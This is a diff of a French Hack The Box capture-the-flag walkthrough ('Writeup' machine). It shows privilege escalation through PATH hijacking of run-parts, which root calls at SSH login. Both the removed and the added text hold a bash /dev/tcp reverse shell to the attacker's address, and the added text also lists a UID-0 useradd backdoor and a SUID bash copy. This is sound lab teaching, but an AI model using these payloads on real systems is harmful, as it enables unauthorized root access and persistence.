@@ -522,25 +522,23 @@ jkr@writeup:~$
 
 ## Escalade de privilèges
 
-{{< recette "privilege-escalation-linux" >}}
-
-### Post-exploitation – Énumération locale
-
-  Une fois connecté en SSH en tant que `jkr`, tu appliques la méthodologie décrite dans la recette
+Une fois connecté en SSH en tant que `jkr`, tu appliques la méthodologie décrite dans la recette
    {{< recette "privilege-escalation-linux" >}}.
 
-  La première étape consiste toujours à vérifier les droits `sudo` :
+### Sudo -l
+
+La première étape consiste toujours à vérifier les droits `sudo` :
 
   ```
   jkr@writeup:~$ sudo -l
   -bash: sudo: command not found
   ```
 
-  L’absence de `sudo` élimine immédiatement cette piste et oriente l’analyse vers les tâches automatiques exécutées par root.
+ L’absence de `sudo` élimine immédiatement cette piste et oriente l’analyse vers les tâches automatiques exécutées par root.
 
 ------
 
-### Observation des tâches root
+### Pspy64
 
 La méthode recommande ensuite d’observer l’activité du système en temps réel à l’aide de `pspy64`, afin d’identifier des commandes exécutées automatiquement avec des privilèges élevés.
 
@@ -577,8 +575,6 @@ Cependant, ce fichier n’est ni lisible ni modifiable par `jkr`, et aucun répe
 
 ------
 
-### Déclenchement et découverte clé
-
 Pendant que `pspy64` est en cours d’exécution, tu ouvres une **nouvelle session SSH dans un autre terminal**, ce qui est une pratique courante pour déclencher les actions automatiques liées à la connexion.
 
 ```bash
@@ -605,234 +601,63 @@ Pendant que `pspy64` est en cours d’exécution, tu ouvres une **nouvelle sessi
 2026/01/16 11:55:09 CMD: UID=1000  PID=2789   | -bash
 ```
 
-À ce moment-là, tu observes une autre commande exécutée par **root** :
+Lors de la connexion SSH, tu observes l’exécution automatique de la commande suivante avec les privilèges root :
 
-  ```bash
-  sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
-  ```
+```
+sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d
+```
 
-- Analyse détaillée de la commande exécutée par root :
+Ici, `run-parts` est appelé **sans chemin absolu**. Lors de son exécution, root recherche donc la commande en suivant **l’ordre des répertoires définis dans la variable d’environnement `PATH`**. En l’absence de détournement, le binaire légitime est trouvé dans `/bin/run-parts`, ce que tu peux vérifier avec la commande `which run-parts`.
 
-  - `sh -c`
+------
 
-    - `sh -c` lance un **shell non interactif**
+En poursuivant l’énumération des permissions, la commande suivante permet d’identifier les répertoires accessibles en écriture par l’utilisateur `jkr` :
 
-    - tout ce qui suit est exécuté **dans ce shell**
+```
+find / -path /home -prune -o -type d -writable -print 2>/dev/null
+```
 
-    - c’est typiquement utilisé dans des scripts système, cron, ou hooks de login
+Les résultats montrent notamment que `jkr` dispose des droits d’écriture sur `/usr/local/bin` et `/usr/local/sbin`. Ces deux répertoires apparaissent **avant `/bin` dans la variable `PATH`**, ce qui est un point clé pour l’exploitation.
 
-  - `/usr/bin/env -i`
+------
 
-    - `env` permet de définir un environnement contrôlé
+Dans ce contexte, si `jkr` place son propre script nommé `run-parts` dans `/usr/local/bin`, c’est ce script qui sera exécuté **en priorité**, à la place du binaire légitime situé dans `/bin`. Ce mécanisme est appelé **détournement de `PATH`** : lorsqu’une commande est invoquée sans chemin absolu, le système exécute le premier fichier correspondant trouvé dans le `PATH`. Il s’agit d’une technique classique et très courante en CTF pour obtenir une escalade de privilèges.
 
-    - `-i` signifie **environnement vide**
-      - toutes les variables existantes sont supprimées
-      - **sauf celles explicitement redéfinies**
-      - Ici, **une seule variable est conservée : `PATH`**
+### Détournement de PATH
 
-  - Définition explicite du `PATH` :
+Pour exploiter le détournement de `PATH`, tu vas créer un **faux script `run-parts`** dans un répertoire présent dans le `PATH` et accessible en écriture par `jkr`, par exemple `/usr/local/bin`.
 
-    ```bash
-    PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin	
-    ```
+Voici quelques idées pour des faux `run-parts` :
 
-    - C'est **le point clé**.
-      - Ordre de recherche des exécutables :
-        - /usr/local/sbin
+1. Le plus simple: faire un `cat /root/root.txt > /tmp/root.txt`
 
-        - /usr/local/bin
-
-        - /usr/sbin
-
-        - /sbin
-
-        - /bin
-
-    - **Le système ne cherche pas directement `/bin/run-parts`**.  Il cherche d'abord un binaire nommé `run-parts` **dans chaque répertoire du PATH, dans cet ordre**
-
-  
-
-  - Exécution de `run-parts` sans chemin absolu
+2. Ajouter/créer un utilisateur avec des droits root
 
    ```bash
-       run-parts --lsbsysinit /etc/update-motd.d
+   #!/bin/bash 
+   useradd -m -p $(openssl passwd -1 "password") -s /bin/bash -o -u 0 jkroot
    ```
 
-  ​     
+   et faire `su jkrout`
 
-  
-
-  **Important** :
-
-
-  - **aucun chemin absolu n'est utilisé**
-  - le shell se repose **entièrement sur le PATH**
-  - **le premier `run-parts` trouvé sera exécuté**
-
-       Tu confirmes d'ailleurs le binaire attendu :
-
-
-```bash
-  jkr@writeup:~$ which run-parts
-  /bin/run-parts
-```
-
-
-
-
-
-  - En situation normale, c'est bien `/bin/run-parts` qui est utilisé
-  - **mais seulement s'il n'existe pas de `run-parts` plus tôt dans le PATH**
-
-  - Croisement avec les répertoires écrivable par l'utilisateur `jkr`
-
-    - Commande utilisée :
-
-        ```bash
-        find / -path /home -prune -o -type d -writable -print 2>/dev/null
-        ```
-
-    - Parmi les résultats, on trouve :
-    
-    - ```bash
-         /usr/local/bin
-         /usr/local/sbin
-         ```
-    
-         
-    
-    - Or ces répertoires sont :
-         - **dans le PATH**
-    
-         - **avant `/bin`**
-    
-         - **accessibles en écriture par `jkr`**
-    
-
- 
-
-**C'est exactement la condition nécessaire pour un détournement de PATH.**
-
-Le mécanisme réel devient alors limpide :
-
-- root exécute une commande avec `PATH` contrôlé
-
-- `run-parts` est appelé **sans chemin absolu**
-
-- le shell cherche `run-parts` dans :
-
-  - `/usr/local/sbin`
-
-  - puis `/usr/local/bin`
-
-  - etc.
-
-- si un fichier exécutable nommé `run-parts` existe dans, par exemple, `/usr/local/bin`
-
-- **il sera exécuté à la place de `/bin/run-parts`** 
-- **avec les privilèges root**
-
-En résumé :
-
-Lorsqu'une commande est lancée par root sans chemin absolu, le système recherche l’exécutable dans les répertoires listés dans le `PATH`. Si l'un de ces répertoires est accessible en écriture, **un utilisateur peut y placer son propre script, qui sera exécuté à la place de celui attendu**.
-
-Dans ce contexte précis, cela permet, par exemple, de déclencher l'exécution d'un reverse shell avec les privilèges root.
-
-### Lancement d'un Reverse Shell
-
-Pour exploiter le détournement de `PATH`, tu vas créer un **faux binaire `run-parts`** dans un répertoire présent dans le `PATH` et accessible en écriture par `jkr`, par exemple `/usr/local/bin`.
-
-1. Préparer le listener sur Kali
-
-Sur ta machine Kali, commence par ouvrir un listener :
-
-```bash
-nc -lvnp 4444
-```
-
-------
-
-2. Créer le binaire piégé sur la cible
-
-Sur la machine cible, commence par créer un fichier nommé `run-parts` dans `/usr/local/` :
-
-```bash
-cd /usr/local/
-nano run-parts
-```
-
-Ajoute le contenu suivant (en adaptant l’IP à celle de ta machine Kali) :
-
-```bash
-#!/bin/bash
-bash -i >& /dev/tcp/10.10.14.X/4444 0>&1
-```
-
-------
-
-3. Rends le binaire exécutable
-
-```bash
-chmod +x run-parts
-```
-
-------
-
-4. Au moment voulu, copie le binaire dans /usr/local/bin
+3. Copier /bin/bash vers /bin/<nom au choix> et lui donner les droits SUID d'exécution root (u+s)
 
    ```bash
-   cp run-parts bin/
+   #!/bin/bash
+   cp /bin/bash /bin/ctf
+   chmod u+s /bin/ctf 
    ```
 
-   
+   et faire `/bin/ctf -p`
 
-5. Déclenche l'exécution
-
-   **Immédiatement après**, connecte-toi en ssh depuis un autre terminal Kali
+4. Lancer un reverse shell
 
    ```bash
-   ssh jkr@writeup.htb
+   #!/bin/bash
+   bash -i >& /dev/tcp/10.10.14.xxx/4444 0>&1 
    ```
 
-   
-
-Aucune action supplémentaire n’est nécessaire.
-Lors de la connexion SSH, un script exécuté avec les privilèges root appelle `run-parts` sans chemin absolu.
- La variable d’environnement `PATH` plaçant `/usr/local/bin` avant `/bin`, le script `run-parts` que tu as créé est exécuté en priorité.
-
-------
-
-5. Vérification côté Kali
-
-Dans le terminal Kali, tu obtiens un shell root.
-
-
-```bash
-┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/writeup]
-└─$ nc -lvnp 4444
-
-listening on [any] 4444 ...
-
-
-connect to [10.10.14.156] from (UNKNOWN) [10.129.43.121] 38928
-bash: cannot set terminal process group (6537): Inappropriate ioctl for device
-bash: no job control in this shell
-root@writeup:/#
-root@writeup:/# whoami
-whoami
-root
-root@writeup:/#
-
-```
-
-### root.txt
-
-```bash
-root@writeup:/# cat /root/root.txt
-cat /root/root.txt
-e36cxxxxxxxxxxxxxxxxxxxxxxxx09cc
-root@writeup:/#
-```
+   avec `nc -lvnp 4444` dans Kali
 
 
 
